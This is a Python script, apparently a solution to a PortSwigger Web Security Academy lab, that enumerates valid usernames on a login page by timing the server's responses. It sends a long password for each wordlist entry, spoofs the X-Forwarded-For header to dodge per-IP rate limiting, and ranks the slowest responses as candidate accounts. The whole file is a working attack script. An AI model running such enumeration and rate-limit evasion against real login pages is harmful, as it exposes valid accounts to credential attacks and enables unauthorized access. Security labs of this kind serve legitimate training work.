import requests

# Load wordlists
usernames = open('PS-wordlists/username/PS-U-L.lst').read().splitlines()
password = 'a' * 100
target = "https://<YOUR-LAB-ID>.web-security-academy.net/login"

results = []

print("[*] Starting timing attack exploitation...")
for i, user in enumerate(usernames):
    # Spoof IP buat menghindari rate-limiting per IP
    headers = {
        "X-Forwarded-For": f"1.1.1.{i+1}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
    }
    data = {"username": user, "password": password}
    
    try:
        r = requests.post(target, data=data, headers=headers, timeout=10)
        
        # PENGGANTI TIME.TIME() -> Presisi membaca server response time
        elapsed = r.elapsed.total_seconds() 
        
        results.append((elapsed, user))
        
        # Kasih penanda kalau ada response yang mencolok di atas 0.5 detik
        flag = " [!] OUTLIER?" if elapsed > 0.5 else ""
        print(f"[{i+1}/{len(usernames)}] {elapsed:.3f}s - {user}{flag}")
        
    except requests.exceptions.RequestException as e:
        print(f"[X] Error pada user {user}: {e}")

# Sorting berdasarkan durasi paling lambat
results.sort(reverse=True)

print("\n=== Top 5 Timing Attack Candidates ===")
for t, u in results[:5]:
    print(f"{t:.3f}s - {u}")
